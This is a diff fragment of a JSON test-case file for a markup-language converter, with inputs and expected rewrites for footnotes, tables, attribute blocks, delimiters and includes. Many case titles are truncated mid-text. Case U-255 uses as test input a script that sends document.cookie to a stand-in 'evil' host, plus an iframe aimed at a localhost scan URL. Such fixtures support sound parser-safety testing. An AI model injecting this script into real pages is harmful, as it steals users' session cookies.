+    "class": "rewrite",
+    "inputs": [
+      ":::\nb[^1]\n\n[^1]: c",
+      ":::\nb[^1]\n[^1]: c",
+      ":::\nb[^1]\n\n[^1]: c\n"
+    ],
+    "outputs": [
+      ":::\nb[^1]\n\n:::\n\n[^1]: c",
+      ":::\nb[^1]\n\n:::\n\n[^1]: c",
+      ":::\nb[^1]\n\n:::\n\n[^1]: c\n"
+    ]
+  },
+  {
+    "id": "U-254",
+    "title": "Inline delimiter and comment ownership changes",
+    "class": "report",
+    "inputs": [
+      "/{+a/{k=b+}\n",
+      "/x /*a %% b*/{.c} y\n"
+    ],
+    "outputs": []
+  },
+  {
+    "id": "U-255",
+    "title": "Slash delimiters pair across escaped HTML tags",
+    "class": "report",
+    "inputs": [
+      "<iframe src=\"http://localhost:8080/scan\"></iframe>\n<script>fetch(\"//evil/?\" + document.cookie)</script>\n"
+    ],
+    "outputs": []
+  },
+  {
+    "id": "U-256",
+    "title": "Tag inside a failed brace attribute",
+    "class": "rewrite",
+    "inputs": [
+      "# H {#id .cls}\n",
+      "{%~{#i}\n"
+    ],
+    "outputs": [
+      "# H {#id .cls\\}\n",
+      "{%~\\{#i}\n"
+    ]
+  },
+  {
+    "id": "U-258",
+    "title": "Backtick run with no closing run",
+    "inputs": [
+      "a `b c\n"
+    ],
+    "outputs": [
+      "a `b c`\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-259",
+    "title": "Span mark that cannot join",
+    "inputs": [
+      "|= ^|\n"
+    ],
+    "outputs": [
+      "|= |\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-262",
+    "title": "<p><span>t</span></p> C2-H-116:",
+    "inputs": [
+      "[t]{data-carve-raw=html}\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-263",
+    "title": "<div class=\"hardbreaks\">\n  <blockquote><p>a<br>\nb</p></blockquote>\n</div> C2-...",
+    "inputs": [
+      "::: \\\n> a\n> b\n:::\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-264",
+    "title": "<div class=\"line-block\">\n  <p>*Roses are red<br>\nViolets are blue*</p>\n</div>...",
+    "inputs": [
+      "::: |\n*Roses are red\nViolets are blue*\n:::\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-265",
+    "title": "interior space runs of a line block",
+    "inputs": [
+      "::: |\nRoses  are red\n:::\n"
+    ],
+    "outputs": [],
+    "class": "none"
+  },
+  {
+    "id": "U-267",
+    "title": "<p>an _a=b_ word</p> The U-065 rewrite {_a=b_} is a valid attribute block wit...",
+    "inputs": [
+      "an _a=b_ word\n"
+    ],
+    "outputs": [
+      "an {_a\\=b_} word\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-269",
+    "title": "Alignment block of a span mark that joins moves to the cells it covers",
+    "inputs": [
+      "|= A |={>^} < |\n| a | b |\n"
+    ],
+    "outputs": [
+      "|= A |= < |\n| a |{>^} b |\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-271",
+    "title": "<table>\n  <tbody>\n    <tr><th scope=\"row\">a</th></tr>\n    <tr><td>b</td></tr>...",
+    "inputs": [
+      "{body-rows=1 body-header-rows=1}\n| a |\n| b |\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-273",
+    "title": "<p><em>This <em>does not</em> nest</em></p> C2-I-051 pushes a delimiter that ...",
+    "inputs": [
+      "/This /does not/ nest/\n"
+    ],
+    "outputs": [
+      "/This \\/does not/ nest\\/\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-274",
+    "title": "<p><strong>a <strong>b</strong> c</strong></p> Inside a braced span a bare pa...",
+    "inputs": [
+      "{*a *b* c*}\n"
+    ],
+    "outputs": [
+      "{*a \\*b\\* c*}\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-275",
+    "title": "<p>a {#id} b</p> C2-I-035 and C2-I-036 make a valid attribute block that atta...",
+    "inputs": [
+      "a {#id} b\n"
+    ],
+    "outputs": [
+      "a \\{#id} b\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-276",
+    "title": "<aside class=\"admonition note\" aria-labelledby=\"adm-1\">\n  <p class=\"admonitio...",
+    "inputs": [
+      "::: note \"Title\"\t[First]\nx\n:::\n"
+    ],
+    "outputs": [
+      "::: note\nx\n:::\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-277",
+    "title": "<pre title=\"T\"><code class=\"language-js\">x\n</code></pre> The quoted title bef...",
+    "inputs": [
+      "```js \"T\"\t[L]\nx\n```\n"
+    ],
+    "outputs": [
+      "```js\nx\n```\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-278",
+    "title": "<pre><code>x\n</code></pre> A backtick run of three or more opens a code fence...",
+    "inputs": [
+      "```\tjs\nx\n```\n"
+    ],
+    "outputs": [
+      "``\tjs\nx``\n```\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-279",
+    "title": "<table>\n  <caption>a\n- b</caption>\n  <tbody>\n    <tr><td>x</td></tr>\n  </tbod...",
+    "inputs": [
+      "|x|\n^ a\n  - b\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-280",
+    "title": "<p><a href=\"/u\">t</a></p> C2-I-079 folds every run of spaces, tabs and one li...",
+    "inputs": [
+      "[t][a\tb]\n\n[a b]: /u\n"
+    ],
+    "outputs": [
+      "[t]\\[a\tb]\n\n[a b]: /u\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-281",
+    "title": "<blockquote>\n  <h1 id=\"Quoted\">Quoted</h1>\n</blockquote>\n<p><a href=\"#Quoted\"...",
+    "inputs": [
+      "> # Quoted\n\n[Quoted][]\n"
+    ],
+    "outputs": [
+      "> # Quoted\n\n\\[Quoted][]\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-282",
+    "title": "<p>p</p> The value of a class key is split at runs of spaces and tabs and an ...",
+    "inputs": [
+      "{class=\"\"}\np\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-283",
+    "title": "<p><a href=\"/u\">x</a></p> A link carries no rel when neither the author nor t...",
+    "inputs": [
+      "[x](/u){rel=\"\"}\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-284",
+    "title": "<p><a href=\"u v\">t</a></p> Whitespace is a space, a tab or a line break, so a...",
+    "inputs": [
+      "[t](u v)\n"
+    ],
+    "outputs": [
+      "\\[t](u v)\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-285",
+    "title": "<p><a href=\" /u\">a</a></p> A narrow no-break space after the space of a link ...",
+    "inputs": [
+      "[a]:  /u\n\n[a][]\n"
+    ],
+    "outputs": [
+      "\\[a]:  /u\n\n[a][]\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-286",
+    "title": "<p>[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[...",
+    "inputs": [
+      "[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[x]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]{.a}\n"
+    ],
+    "outputs": [
+      "[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[x\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]]{.a}\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-287",
+    "title": "<table>\n  <tbody>\n    <tr><td>a</td><td>b</td></tr>\n  </tbody>\n</table> With ...",
+    "inputs": [
+      "| a | b |\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-288",
+    "title": "<p data-source-line=\"99\">p</p> With sourceLines on, the generated value repla...",
+    "inputs": [
+      "{data-source-line=\"99\"}\np\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-289",
+    "title": "<p>{{ a.crv @shift:1 }}</p> An unexpanded include renders the directive as te...",
+    "inputs": [
+      "{{ a.crv @shift:1 }}\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-290",
+    "title": "<p>x {{ a.crv <span class=\"mention\"><strong>@lines</strong></span>:0 }} y</p>...",
+    "inputs": [
+      "x {{ a.crv @lines:0 }} y\n"
+    ],
+    "outputs": [
+      "x {{ a.crv \\@lines:0 }} y\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-291",
+    "title": "<p>{{ a.crv @code:js }}</p> An unexpanded include writes the directive from t...",
+    "inputs": [
+      "{{ a.crv@code:js }}\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-292",
+    "title": "<p>{{ a.crv @code:js }}</p> An include's own attributes are not written to HT...",
+    "inputs": [
+      "{.diff}\n{{ a.crv @code:js }}\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-293",
+    "title": "<div>\n\n</div> Under minimal this empty div writes nothing:",
+    "inputs": [
+      ":::\n:::\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-300",
+    "title": "<p>a\nc</p> C2-B-138:",
+    "inputs": [
+      "`a\n%% b\nc`\n"
+    ],
+    "outputs": [
+      "`a\nc`\n%% b\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-301",
+    "title": "<p>—\nt:",
+    "inputs": [
+      "{{ a.crv @lines:3-7 }}\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-302",
+    "title": "<p>See <a href=\"/u\">s</a> and <abbr title=\"Hyper\">HTML</abbr>.</p> for an a.c...",
+    "inputs": [
+      "{{ a.crv @region:k }}\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-303",
+    "title": "<table>\n  <thead>\n    <tr><th scope=\"col\">a</th></tr>\n  </thead>\n  <tbody>\n  ...",
+    "inputs": [
+      "|=\ta|\n| x |\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-304",
+    "title": "<table>\n  <tbody>\n    <tr><td class=\"c\" style=\"text-align:",
+    "inputs": [
+      "|{>.c} a |\n"
+    ],
+    "outputs": [
+      "|\\{>.c} a |\n"
+    ],
+    "class": "escape"
+  },
+  {
+    "id": "U-305",
+    "title": "<table>\n  <tbody>\n    <tr><td style=\"text-align:",
+    "inputs": [
+      "|{>}{^} a |\n"
+    ],
+    "outputs": [
+      "|\\{>}{^} a |\n"
+    ],
+    "class": "escape"
+  },
+  {
+    "id": "U-340",
+    "title": "<p>[^ ]:",
+    "inputs": [
+      "[^ ]: x\n\na[^ ]\n"
+    ],
+    "outputs": [
+      "[^blank]: x\n\na[^blank]\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-341",
+    "title": "With social:",
+    "inputs": [
+      "@alice and #news\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-360",
+    "title": "<p>{{ a.txt @code }}</p>\n<p>cap</p> C2-B-147 and C2-N-073 attach a caption li...",
+    "inputs": [
+      "{{ a.txt @code }}\n^ cap\n"
+    ],
+    "outputs": [
+      "{{ a.txt @code }}\n\n^ cap\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-361",
+    "title": "<dl>\n  <dt>t</dt>\n  <dd>d</dd>\n</dl>\n<p>:",
+    "inputs": [
+      ":: t\n: d\n%%%\n%%%\n: d2\n"
+    ],
+    "outputs": [
+      ":: t\n: d\n  %%%\n  %%%\n: d2\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-362",
+    "title": "<ul>\n  <li>a\n    <ul>\n      <li>b</li>\n    </ul>\n  </li>\n</ul> A line indente...",
+    "inputs": [
+      "- a\n\n {%%}\n  - b\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-363",
+    "title": "<p>a ‘word</p> C2-I-026 tests the characters on the two sides of a braced com...",
+    "inputs": [
+      "a {%%}'word\n"
+    ],
+    "outputs": [
+      "a {%%}’word\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-364",
+    "title": "<p>a#tag</p> C2-I-026 tests the characters on the two sides of a braced comme...",
+    "inputs": [
+      "a{%%}#tag\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-365",
+    "title": "<p>{-{#x-}</p> {#x-} is a valid attribute block, one atom taken whole (C2-I-0...",
+    "inputs": [
+      "{-{#x-}\n"
+    ],
+    "outputs": [
+      "{-\\{#x-}\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-366",
+    "title": "<section id=\"A\">\n  <h1>A <a href=\"#A\">A </a></h1>\n</section> A resolved cross...",
+    "inputs": [
+      "# A </#A>\n"
+    ],
+    "outputs": [
+      "{#A}\n# A [A A ](#A)\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-367",
+    "title": "<figure id=\"t\">\n  <img src=\"u\" alt=\"a\">\n  <figcaption><span class=\"tag\"><stro...",
+    "inputs": [
+      "{#t}\n![a](u)\n^ #y#\n\n</#t>\n"
+    ],
+    "outputs": [
+      "{#t}\n![a](u)\n^ #y#\n\n[#y 1](#t)\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-368",
+    "title": "<p>js </p>\n<pre><code></code></pre> A backtick run whose info string holds a ...",
+    "inputs": [
+      "```js `\n```\n"
+    ],
+    "outputs": [
+      "```js\n```\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-369",
+    "title": "<table>\n  <tbody>\n    <tr><td rowspan=\"2\">a</td></tr>\n    <tr></tr>\n  </tbody...",
+    "inputs": [
+      "| a |\n|{.x} ^ |\n"
+    ],
+    "outputs": [
+      "| a |\n|{.x} \\^ |\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-370",
+    "title": "<pre><code>code\n</code></pre> C2-B-222 ends every body line of a code block w...",
+    "inputs": [
+      "```\ncode"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-371",
+    "title": "<p>[x][no]{#i .c}</p> An unresolved reference writes its glued attribute bloc...",
+    "inputs": [
+      "[x][no]{.c}{#i}\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  }
+]
